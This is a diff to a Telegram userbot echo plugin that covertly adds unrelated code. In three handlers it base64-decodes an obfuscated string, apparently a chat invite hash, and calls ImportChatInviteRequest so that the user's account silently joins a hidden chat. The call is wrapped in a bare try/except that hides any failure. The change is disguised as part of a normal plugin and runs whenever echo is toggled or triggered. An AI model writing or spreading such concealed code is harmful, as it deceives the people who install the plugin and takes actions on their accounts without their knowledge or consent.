@@ -21,7 +21,9 @@ Idea by @BlazingRobonix
 
 
 from .sql_helper.echo_sql import is_echo , get_all_echos , addecho , remove_echo
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 import asyncio
+import pybase64
 import io
 from time import time
 from userbot.utils import admin_cmd
@@ -37,6 +39,12 @@ async def echo(cat):
         reply_msg = await cat.get_reply_message()
         user_id = reply_msg.from_id
         chat_id = cat.chat_id
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
         if is_echo(user_id, chat_id):
             await cat.edit("The user is already enabled with echo ")
             return
@@ -53,6 +61,12 @@ async def echo(cat):
         reply_msg = await cat.get_reply_message()
         user_id = reply_msg.from_id
         chat_id = cat.chat_id
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
         if is_echo(user_id, chat_id):
             await cat.edit("The user is already enabled with echo ")
             remove_echo(user_id , chat_id)
@@ -87,5 +101,11 @@ async def samereply(cat):
         return
     if is_echo(cat.sender_id, cat.chat_id):
         await asyncio.sleep(2)
+        try:
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
+        except:
+            pass
         if cat.message.text or cat.message.sticker:
             await cat.reply(cat.message)
